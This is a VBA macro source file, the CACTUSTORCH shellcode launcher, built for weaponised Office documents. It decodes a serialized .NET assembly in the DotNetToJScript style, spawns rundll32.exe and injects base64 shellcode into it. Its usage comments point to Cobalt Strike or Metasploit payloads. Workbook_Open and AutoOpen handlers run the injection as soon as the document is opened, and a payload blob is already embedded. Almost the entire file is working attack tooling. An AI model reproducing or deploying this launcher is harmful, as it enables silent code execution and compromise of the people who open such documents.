'                                (              )  (            )  
'   (    (       (    *   )      )\ )  *   ) ( /(  )\ )  (   ( /(  
'   )\   )\      )\ ` )  /(   ( (()/(` )  /( )\())(()/(  )\  )\()) 
' (((_|(((_)(  (((_) ( )(_))  )\ /(_))( )(_)|(_)\  /(_)|((_)((_)\  
' )\___)\ _ )\ )\___(_(_())_ ((_|_)) (_(_())  ((_)(_)) )\___ _((_) 
'((/ __(_)_\(_|(/ __|_   _| | | / __||_   _| / _ \| _ ((/ __| || | 
' | (__ / _ \  | (__  | | | |_| \__ \  | |  | (_) |   /| (__| __ | 
'  \___/_/ \_\  \___| |_|  \___/|___/  |_|   \___/|_|_\ \___|_||_| 
'                                                                 
' Author: Vincent Yiu (@vysecurity)
' Credits:
'   - @cn33liz: Inspiration with StarFighter
'   - @tiraniddo: James Forshaw for DotNet2JScript
'   - @armitagehacker: Raphael Mudge for idea of selecting 32 bit version on 64 bit architecture machines for injection into

' A VBA shellcode launcher for Macros. This will spawn a 32 bit version of the binary specified and inject shellcode into it.
' Macro will not need to declare winapi :)

' Usage:
' Choose a binary you want to inject into, default "rundll32.exe", you can use notepad.exe, calc.exe for example...
' Generate a 32 bit raw shellcode in whatever framework you want. Tested: Cobalt Strike, Metasploit Framework
' Run: cat payload.bin | base64 -w 0 > out.txt
' Run the payload through splitvba: python splitvba.py out.txt code.txt
' Copy code.txt into the section specified below.


Sub SetVersion
Dim shell
Set shell = CreateObject("WScript.Shell")
Dim ver
ver = "v4.0.30319"
On Error Resume Next
shell.RegRead "HKLM\SOFTWARE\\Microsoft\.NETFramework\v4.0.30319\"
If Err.Number <> 0 Then
  ver = "v2.0.50727"
  Err.Clear
End If
shell.Environment("Process").Item("COMPLUS_Version") = ver
End Sub

Public binary As String
Public code As String

Sub Init()
    ' Replace with binary name that you want to inject into. This can be anything that exists both in SYSWOW64 and SYSTEM32
    binary = "rundll32.exe"

    code = ""
    
    ' Paste the output from splitvba.py below here
    code = code & "TVroAAAAAFtSRVWJ5YHDcoAAAP/TicNXaAQAAABQ/9Bo8LWiVmgFAAAAUP/TAAAAAAAAAAAAAAAAAAAA8AAAAA4fug4AtAnNIbgB"
    code = code & "TM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACf0hwW27NyRduzckXbs3JFZvzkRdqz"
    code = code & "ckXF4fZF8rNyRcXh50XIs3JFxeHxRVqzckX8dQlF1LNyRduzc0UGs3JFxeH7RWKzckXF4eBF2rNyRcXh40Xas3JFUmljaNuzckUA"
    code = code & "AAAAAAAAAAAAAAAAAAAAUEUAAEwBBQBOViNZAAAAAAAAAADgAAKhCwEJAABCAgAA4gAAAAAAAFFvAQAAEAAAAGACAAAAABAAEAAA"
    code = code & "AAIAAAUAAAAAAAAABQAAAAA"
End Sub

Private Function decodeHex(hex)
    On Error Resume Next
    Dim DM, EL
    Set DM = CreateObject("Microsoft.XMLDOM")
    Set EL = DM.createElement("tmp")
    EL.DataType = "bin.hex"
    EL.Text = hex
    decodeHex = EL.NodeTypedValue
End Function

Function Run()

    On Error Resume Next
    
    SetVersion

    Dim serialized_obj
        serialized_obj = "0001000000FFFFFFFF010000000000000004010000002253797374656D2E44656C656761746553657269616C697A6174696F"
    serialized_obj = serialized_obj & "6E486F6C646572030000000844656C65676174650774617267657430076D6574686F64300303033053797374656D2E44656C"
    serialized_obj = serialized_obj & "656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E7472792253797374656D2E44656C65"
    serialized_obj = serialized_obj & "6761746553657269616C697A6174696F6E486F6C6465722F53797374656D2E5265666C656374696F6E2E4D656D626572496E"
    serialized_obj = serialized_obj & "666F53657269616C697A6174696F6E486F6C64657209020000000903000000090400000004020000003053797374656D2E44"
    serialized_obj = serialized_obj & "656C656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E74727907000000047479706508"
    serialized_obj = serialized_obj & "617373656D626C79067461726765741274617267657454797065417373656D626C790E746172676574547970654E616D650A"
    serialized_obj = serialized_obj & "6D6574686F644E616D650D64656C6567617465456E747279010102010101033053797374656D2E44656C6567617465536572"
    serialized_obj = serialized_obj & "69616C697A6174696F6E486F6C6465722B44656C6567617465456E74727906050000002F53797374656D2E52756E74696D65"
    serialized_obj = serialized_obj & "2E52656D6F74696E672E4D6573736167696E672E48656164657248616E646C657206060000004B6D73636F726C69622C2056"
    serialized_obj = serialized_obj & "657273696F6E3D322E302E302E302C2043756C747572653D6E65757472616C2C205075626C69634B6579546F6B656E3D6237"
    serialized_obj = serialized_obj & "376135633536313933346530383906070000000774617267657430090600000006090000000F53797374656D2E44656C6567"
    serialized_obj = serialized_obj & "617465060A0000000D44796E616D6963496E766F6B650A04030000002253797374656D2E44656C656761746553657269616C"
    serialized_obj = serialized_obj & "697A6174696F6E486F6C646572030000000844656C65676174650774617267657430076D6574686F64300307033053797374"
    serialized_obj = serialized_obj & "656D2E44656C656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E747279022F53797374"
    serialized_obj = serialized_obj & "656D2E5265666C656374696F6E2E4D656D626572496E666F53657269616C697A6174696F6E486F6C646572090B000000090C"
    serialized_obj = serialized_obj & "000000090D00000004040000002F53797374656D2E5265666C656374696F6E2E4D656D626572496E666F53657269616C697A"
    serialized_obj = serialized_obj & "6174696F6E486F6C64657206000000044E616D650C417373656D626C794E616D6509436C6173734E616D65095369676E6174"
    serialized_obj = serialized_obj & "7572650A4D656D626572547970651047656E65726963417267756D656E7473010101010003080D53797374656D2E54797065"
    serialized_obj = serialized_obj & "5B5D090A0000000906000000090900000006110000002C53797374656D2E4F626A6563742044796E616D6963496E766F6B65"
    serialized_obj = serialized_obj & "2853797374656D2E4F626A6563745B5D29080000000A010B0000000200000006120000002053797374656D2E586D6C2E5363"
    serialized_obj = serialized_obj & "68656D612E586D6C56616C756547657474657206130000004D53797374656D2E586D6C2C2056657273696F6E3D322E302E30"
    serialized_obj = serialized_obj & "2E302C2043756C747572653D6E65757472616C2C205075626C69634B6579546F6B656E3D6237376135633536313933346530"
    serialized_obj = serialized_obj & "383906140000000774617267657430090600000006160000001A53797374656D2E5265666C656374696F6E2E417373656D62"
    serialized_obj = serialized_obj & "6C790617000000044C6F61640A0F0C000000001E0000024D5A90000300000004000000FFFF0000B800000000000000400000"
    serialized_obj = serialized_obj & "000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD"
    serialized_obj = serialized_obj & "21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000"
    serialized_obj = serialized_obj & "00504500004C0103005886A25A0000000000000000E00022200B013000001600000006000000000000EE3500000020000000"
    serialized_obj = serialized_obj & "4000000000001000200000000200000400000000000000040000000000000000800000000200000000000003004085000010"
    serialized_obj = serialized_obj & "00001000000000100000100000000000001000000000000000000000009C3500004F00000000400000900300000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000006000000C00000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E"
    serialized_obj = serialized_obj & "74657874000000F4150000002000000016000000020000000000000000000000000000200000602E72737263000000900300"
    serialized_obj = serialized_obj & "00004000000004000000180000000000000000000000000000400000402E72656C6F6300000C000000006000000002000000"
    serialized_obj = serialized_obj & "1C00000000000000000000000000004000004200000000000000000000000000000000D03500000000000048000000020005"
    serialized_obj = serialized_obj & "000C220000901300000100000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000001E02280F00000A2A13300A001C0100000100001104281000000A0A1201068E69281100"
    serialized_obj = serialized_obj & "000A730A0000060C08167D35000004720100007013047203000070281200000A6F1300000A163119721D000070281200000A"
    serialized_obj = serialized_obj & "722B00007003281400000A13042B17721D000070281200000A724100007003281400000A13041104141414171A7E1500000A"
    serialized_obj = serialized_obj & "14081203280100000626097B0400000413051205281600000A7257000070281700000A3980000000110516731100000A0720"
    serialized_obj = serialized_obj & "003000001A280200000613061206281600000A7257000070281800000A2C0A1105162805000006262A1613071208068E6928"
    serialized_obj = serialized_obj & "1100000A11051106061108110728040000062611051106071F2016731100000A280300000626110516731100000A16110616"
    serialized_obj = serialized_obj & "731100000A1616731100000A2806000006262A7A027E1500000A7D0200000402280F00000A0202281900000A7D010000042A"
    serialized_obj = serialized_obj & "00133002006000000000000000027E1500000A7D2B000004027E1500000A7D2C000004027E1500000A7D2D000004027E1500"
    serialized_obj = serialized_obj & "000A7D38000004027E1500000A7D39000004027E1500000A7D3A000004027E1500000A7D3B00000402280F00000A02022819"
    serialized_obj = serialized_obj & "00000A7D2A0000042A42534A4201000100000000000C00000076322E302E35303732370000000005006C0000005C07000023"
    serialized_obj = serialized_obj & "7E0000C80700007409000023537472696E6773000000003C1100005C00000023555300981100001000000023475549440000"
    serialized_obj = serialized_obj & "00A8110000E801000023426C6F620000000000000002000001571D02140902000000FA013300160000010000001700000009"
    serialized_obj = serialized_obj & "000000500000000A000000240000001900000033000000120000000100000001000000060000000100000001000000070000"
    serialized_obj = serialized_obj & "000000990601000000000006005C0592070600C905920706008A0460070F00B20700000600B204E10606003005E106060011"
    serialized_obj = serialized_obj & "05E1060600B005E10606007C05E10606009505E1060600C904E10606009E04730706007C0473070600F404E1060600AB08A9"
    serialized_obj = serialized_obj & "0606006104A90606004D05A9060600B006A9060600E408A90606005907A9060600D808A90606006606A90606008406730700"
    serialized_obj = serialized_obj & "00000025000000000001000100010010006D0600003D00010001000A001000F80700003D00010009000A011000CE06000041"
    serialized_obj = serialized_obj & "0004000A00020100001B080000490008000A000201000036080000490027000A000A001000060700003D002A000A00020100"
    serialized_obj = serialized_obj & "006D04000049003C000B0002010000F3060000490045000B0006007D06FA00060044073F0006002404FD00060074083F0006"
    serialized_obj = serialized_obj & "00E7033F000600C803FA000600BD03FA0006069E0300015680B20203015680C00203015680640003015680880203015680C2"
    serialized_obj = serialized_obj & "0003015680530203015680F101030156801D0203015680050203015680A001030156800203030156805E0103015680480103"
    serialized_obj = serialized_obj & "015680E101030156804D02030156803102030156806A03030156808203030156809902030156801D03030156807601030156"
    serialized_obj = serialized_obj & "807500030156803D0003015680270103015680A800030156803A0303015680B90103015680180103015680C60103015680E5"
    serialized_obj = serialized_obj & "02030106069E0300015680910007015680720207010600A603FA000600EF033F00060017073F00060033043F0006004B03FA"
    serialized_obj = serialized_obj & "0006009A03FA000600E705FA000600EF05FA0006004708FA0006005508FA000600E404FA0006002E08FA00060001090B0106"
    serialized_obj = serialized_obj & "000D000B01060019003F000600EC083F000600F6083F00060034073F0006069E0300015680DE020E015680EF000E0156809D"
    serialized_obj = serialized_obj & "010E015680D8020E015680D5010E0156800F010E01568094010E01568003010E0106069E0300015680E70012015680570012"
    serialized_obj = serialized_obj & "015680D500120156805803120156806902120156804F0312015680DD00120156806003120156801106120156802406120156"
    serialized_obj = serialized_obj & "803906120100000000800096202E001601010000000000800096200D092A010B0000000000800096201C0935011000000000"
    serialized_obj = serialized_obj & "008000962034093F0115000000000080009620630849011A000000000080009120D4034F011C0050200000000086183E0706"
    serialized_obj = serialized_obj & "00230058200000000086004D045A01230080210000000086183E0706002500A0210000000086183E0706002500000001003B"
    serialized_obj = serialized_obj & "0400000200530400000300E40700000400D10700000500C107000006000B0800000700D60800000800470901000900040702"
    serialized_obj = serialized_obj & "000A00CC06000001001B04000002008B08000003000306000004006B0400000500BF08000001001B04000002008B08000003"
    serialized_obj = serialized_obj & "00030600000400C90800000500B208000001007408000002007D0800000300210700000400030600000500B5060000010074"
    serialized_obj = serialized_obj & "0800000200FA0300000100740800000200D10700000300F705000004009508000005002807000006000B0800000700B20300"
    serialized_obj = serialized_obj & "0001002D0900000200010009003E07010011003E07060019003E070A0029003E07100031003E07100039003E07100041003E"
    serialized_obj = serialized_obj & "07100049003E07100051003E07100059003E07100061003E07150069003E07100071003E07100089003E07060079003E0706"
    serialized_obj = serialized_obj & "00990053062900A1003E070100A90004042F00B10079063400B100A4083800A10012073F00A10064064200B10066094600B1"
    serialized_obj = serialized_obj & "005A094600B9000A064C00090024005A00090028005F0009002C006400090030006900090034006E0009003800730009003C"
    serialized_obj = serialized_obj & "007800090040007D0009004400820009004800870009004C008C00090050009100090054009600090058009B0009005C00A0"
    serialized_obj = serialized_obj & "0009006000A50009006400AA0009006800AF0009006C00B40009007000B90009007400BE0009007800C30009007C00C80009"
    serialized_obj = serialized_obj & "008000CD0009008400D20009008800D70009008C00DC0009009000E10009009400E60009009800EB000900A0005A000900A4"
    serialized_obj = serialized_obj & "005F000900F40096000900F8009B000900FC00F00009000001B90009000401E10009000801F50009000C01BE0009001001C3"
    serialized_obj = serialized_obj & "00090018016E0009001C017300090020017800090024017D00090028015A0009002C015F0009003001640009003401690009"
    serialized_obj = serialized_obj & "003801820009003C018700090040018C002E000B0060012E00130069012E001B0088012E00230091012E002B0091012E0033"
    serialized_obj = serialized_obj & "00A2012E003B00A2012E00430091012E004B0091012E005300A2012E005B00A8012E006300AE012E006B00D80143005B00A8"
    serialized_obj = serialized_obj & "01A30073005A00C30073005A00030173005A00230173005A001A008C06000103002E000100000105000D090100000107001C"
    serialized_obj = serialized_obj & "090100000109003409010000010B006308010000010D00D4030100048000000100000000000000000000000000F700000002"
    serialized_obj = serialized_obj & "00000000000000000000005100A9030000000003000200040002000500020006000200070002000800020009000200000000"
    serialized_obj = serialized_obj & "00007368656C6C636F64653332006362526573657276656432006C70526573657276656432003C4D6F64756C653E00437265"
    serialized_obj = serialized_obj & "61746550726F6365737341004352454154455F425245414B415741595F46524F4D5F4A4F4200455845435554455F52454144"
    serialized_obj = serialized_obj & "004352454154455F53555350454E4445440050524F434553535F4D4F44455F4241434B47524F554E445F454E44004455504C"
    serialized_obj = serialized_obj & "49434154455F434C4F53455F534F55524345004352454154455F44454641554C545F4552524F525F4D4F4445004352454154"
    serialized_obj = serialized_obj & "455F4E45575F434F4E534F4C4500455845435554455F52454144575249544500455845435554450052455345525645004341"
    serialized_obj = serialized_obj & "43545553544F5243480057524954455F574154434800504859534943414C0050524F46494C455F4B45524E454C0043524541"
    serialized_obj = serialized_obj & "54455F50524553455256455F434F44455F415554485A5F4C4556454C004352454154455F5348415245445F574F575F56444D"
    serialized_obj = serialized_obj & "004352454154455F53455041524154455F574F575F56444D0050524F434553535F4D4F44455F4241434B47524F554E445F42"
    serialized_obj = serialized_obj & "4547494E00544F505F444F574E00474F004352454154455F4E45575F50524F434553535F47524F55500050524F46494C455F"
    serialized_obj = serialized_obj & "555345520050524F46494C455F534552564552004C415247455F5041474553004352454154455F464F524345444F53004944"
    serialized_obj = serialized_obj & "4C455F5052494F524954595F434C415353005245414C54494D455F5052494F524954595F434C41535300484947485F505249"
    serialized_obj = serialized_obj & "4F524954595F434C4153530041424F56455F4E4F524D414C5F5052494F524954595F434C4153530042454C4F575F4E4F524D"
    serialized_obj = serialized_obj & "414C5F5052494F524954595F434C415353004E4F414343455353004455504C49434154455F53414D455F4143434553530044"
    serialized_obj = serialized_obj & "455441434845445F50524F43455353004352454154455F50524F5445435445445F50524F434553530044454255475F50524F"
    serialized_obj = serialized_obj & "434553530044454255475F4F4E4C595F544849535F50524F4345535300524553455400434F4D4D4954004352454154455F49"
    serialized_obj = serialized_obj & "474E4F52455F53595354454D5F44454641554C54004352454154455F554E49434F44455F454E5649524F4E4D454E54004558"
    serialized_obj = serialized_obj & "54454E4445445F53544152545550494E464F5F50524553454E54004352454154455F4E4F5F57494E444F5700647758005245"
    serialized_obj = serialized_obj & "41444F4E4C5900455845435554455F5752495445434F505900494E48455249545F504152454E545F414646494E4954590049"
    serialized_obj = serialized_obj & "4E48455249545F43414C4C45525F5052494F52495459006477590076616C75655F5F006362006D73636F726C6962006C7054"
    serialized_obj = serialized_obj & "68726561644964006477546872656164496400647750726F6365737349640043726561746552656D6F746554687265616400"
    serialized_obj = serialized_obj & "68546872656164006C705265736572766564007545786974436F646500476574456E7669726F6E6D656E745661726961626C"
    serialized_obj = serialized_obj & "65006C7048616E646C650062496E686572697448616E646C65006C705469746C65006C704170706C69636174696F6E4E616D"
    serialized_obj = serialized_obj & "6500666C616D65006C70436F6D6D616E644C696E650056616C75655479706500666C416C6C6F636174696F6E547970650047"
    serialized_obj = serialized_obj & "7569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275"
    serialized_obj = serialized_obj & "746500417373656D626C795469746C6541747472696275746500417373656D626C7954726164656D61726B41747472696275"
    serialized_obj = serialized_obj & "746500647746696C6C41747472696275746500417373656D626C7946696C6556657273696F6E417474726962757465004173"
    serialized_obj = serialized_obj & "73656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E4174"
    serialized_obj = serialized_obj & "7472696275746500466C61677341747472696275746500436F6D70696C6174696F6E52656C61786174696F6E734174747269"
    serialized_obj = serialized_obj & "6275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F70797269676874417474"
    serialized_obj = serialized_obj & "72696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C69"
    serialized_obj = serialized_obj & "74794174747269627574650064775853697A650064775953697A65006477537461636B53697A6500647753697A650053697A"
    serialized_obj = serialized_obj & "654F660047554152445F4D6F646966696572666C6167004E4F43414348455F4D6F646966696572666C616700575249544543"
    serialized_obj = serialized_obj & "4F4D42494E455F4D6F646966696572666C61670046726F6D426173653634537472696E6700546F537472696E670063616374"
    serialized_obj = serialized_obj & "7573546F726368006765745F4C656E677468004D61727368616C006B65726E656C33322E646C6C00434143545553544F5243"
    serialized_obj = serialized_obj & "482E646C6C0053797374656D00456E756D006C704E756D6265724F6642797465735772697474656E006C7050726F63657373"
    serialized_obj = serialized_obj & "496E666F726D6174696F6E0053797374656D2E5265666C656374696F6E004D656D6F727950726F74656374696F6E006C7053"
    serialized_obj = serialized_obj & "746172747570496E666F005A65726F006C704465736B746F7000627566666572006C70506172616D65746572006853746445"
    serialized_obj = serialized_obj & "72726F72002E63746F72006C70536563757269747944657363726970746F7200496E745074720053797374656D2E44696167"
    serialized_obj = serialized_obj & "6E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74"
    serialized_obj = serialized_obj & "696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730062496E686572697448616E646C65"
    serialized_obj = serialized_obj & "73006C7054687265616441747472696275746573006C7050726F636573734174747269627574657300536563757269747941"
    serialized_obj = serialized_obj & "7474726962757465730064774372656174696F6E466C6167730043726561746550726F63657373466C616773006477466C61"
    serialized_obj = serialized_obj & "6773004475706C69636174654F7074696F6E7300647758436F756E74436861727300647759436F756E744368617273005465"
    serialized_obj = serialized_obj & "726D696E61746550726F63657373006850726F63657373006C704261736541646472657373006C7041646472657373006C70"
    serialized_obj = serialized_obj & "53746172744164647265737300436F6E636174004F626A65637400666C4F6C6450726F7465637400666C50726F7465637400"
    serialized_obj = serialized_obj & "666C4E657750726F74656374006C70456E7669726F6E6D656E7400436F6E766572740068537464496E70757400685374644F"
    serialized_obj = serialized_obj & "7574707574007753686F7757696E646F77005669727475616C416C6C6F634578005669727475616C50726F74656374457800"
    serialized_obj = serialized_obj & "62696E61727900577269746550726F636573734D656D6F7279006C7043757272656E744469726563746F7279006F705F4571"
    serialized_obj = serialized_obj & "75616C697479006F705F496E657175616C6974790000010019500072006F006700720061006D005700360034003300320000"
    serialized_obj = serialized_obj & "0D770069006E0064006900720000155C0053007900730057004F005700360034005C0000155C00530079007300740065006D"
    serialized_obj = serialized_obj & "00330032005C000003300000001662F14473FD1A4190700B9987CFFABE00042001010803200001052001011111042001010E"
    serialized_obj = serialized_obj & "04200101020E07091D0518121C11100E181808180500011D050E0400010E0E032000080600030E0E0E0E0206180320000E05"
    serialized_obj = serialized_obj & "0002020E0E040001081C08B77A5C561934E08904010000000402000000040400000004080000000410000000042000000004"
    serialized_obj = serialized_obj & "4000000004800000000400010000040002000004000400000400080000040010000004002000000400400000040080000004"
    serialized_obj = serialized_obj & "0000010004000002000400000400040000080004000010000400002000040000000104000000020400000004040000000804"
    serialized_obj = serialized_obj & "0000001004000000200400000040040000008004003000000400004000020608020602020609030611140306111802060603"
    serialized_obj = serialized_obj & "0611200306112413000A180E0E120C120C021114180E121C1011100A00051818181811201124090005181818181124180900"
    serialized_obj = serialized_obj & "050218181D0518080500020218090A00071818180918180918052002010E0E0801000800000000001E010001005402165772"
    serialized_obj = serialized_obj & "61704E6F6E457863657074696F6E5468726F7773010801000200000000001001000B434143545553544F5243480000050100"
    serialized_obj = serialized_obj & "0000000501000100002901002435363539386631632D366438382D343939342D613339322D61663333376162653537373700"
    serialized_obj = serialized_obj & "000C010007312E302E302E300000000000C43500000000000000000000DE3500000020000000000000000000000000000000"
    serialized_obj = serialized_obj & "00000000000000D0350000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF"
    serialized_obj = serialized_obj & "2500200010000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000"
    serialized_obj = serialized_obj & "0000000000010001000000300000800000000000000000000000000000010000000000480000005840000034030000000000"
    serialized_obj = serialized_obj & "0000000000340334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00"
    serialized_obj = serialized_obj & "000100000001000000000000000100000000003F000000000000000400000002000000000000000000000000000000440000"
    serialized_obj = serialized_obj & "000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C00610074"
    serialized_obj = serialized_obj & "0069006F006E00000000000000B00494020000010053007400720069006E006700460069006C00650049006E0066006F0000"
    serialized_obj = serialized_obj & "0070020000010030003000300030003000340062003000000030000C00010043006F006D006D0065006E0074007300000043"
    serialized_obj = serialized_obj & "004100430054005500530054004F00520043004800000022000100010043006F006D00700061006E0079004E0061006D0065"
    serialized_obj = serialized_obj & "00000000000000000040000C000100460069006C0065004400650073006300720069007000740069006F006E000000000043"
    serialized_obj = serialized_obj & "004100430054005500530054004F005200430048000000300008000100460069006C006500560065007200730069006F006E"
    serialized_obj = serialized_obj & "000000000031002E0030002E0030002E003000000040001000010049006E007400650072006E0061006C004E0061006D0065"
    serialized_obj = serialized_obj & "00000043004100430054005500530054004F005200430048002E0064006C006C0000003C000C0001004C006500670061006C"
    serialized_obj = serialized_obj & "0043006F007000790072006900670068007400000043004100430054005500530054004F0052004300480000002A00010001"
    serialized_obj = serialized_obj & "004C006500670061006C00540072006100640065006D00610072006B00730000000000000000004800100001004F00720069"
    serialized_obj = serialized_obj & "00670069006E0061006C00460069006C0065006E0061006D006500000043004100430054005500530054004F005200430048"
    serialized_obj = serialized_obj & "002E0064006C006C00000038000C000100500072006F0064007500630074004E0061006D0065000000000043004100430054"
    serialized_obj = serialized_obj & "005500530054004F005200430048000000340008000100500072006F006400750063007400560065007200730069006F006E"
    serialized_obj = serialized_obj & "00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C007900200056006500720073"
    serialized_obj = serialized_obj & "0069006F006E00000031002E0030002E0030002E003000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000003000000C000000F0"
    serialized_obj = serialized_obj & "3500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "000000010D00000004000000091700000009060000000916000000061A0000002753797374656D2E5265666C656374696F6E"
    serialized_obj = serialized_obj & "2E417373656D626C79204C6F616428427974655B5D29080000000A0B"

    entry_class = "cactusTorch"

    Dim stm As Object, fmt As Object, al As Object
    Set stm = CreateObject("System.IO.MemoryStream")
    Set fmt = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
    Set al = CreateObject("System.Collections.ArrayList")

    Dim dec
    dec = decodeHex(serialized_obj)

    For Each i In dec
        stm.WriteByte i
    Next i

    stm.Position = 0

    Dim n As Object, d As Object, o As Object
    Set n = fmt.SurrogateSelector
    Set d = fmt.Deserialize_2(stm)
    al.Add n

    Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
    o.flame binary,code
End Function

Sub Workbook_Open()
Init
Run
End Sub

Sub AutoOpen()
Init
Run
End Sub

Sub Auto_Open()
AutoOpen
End Sub
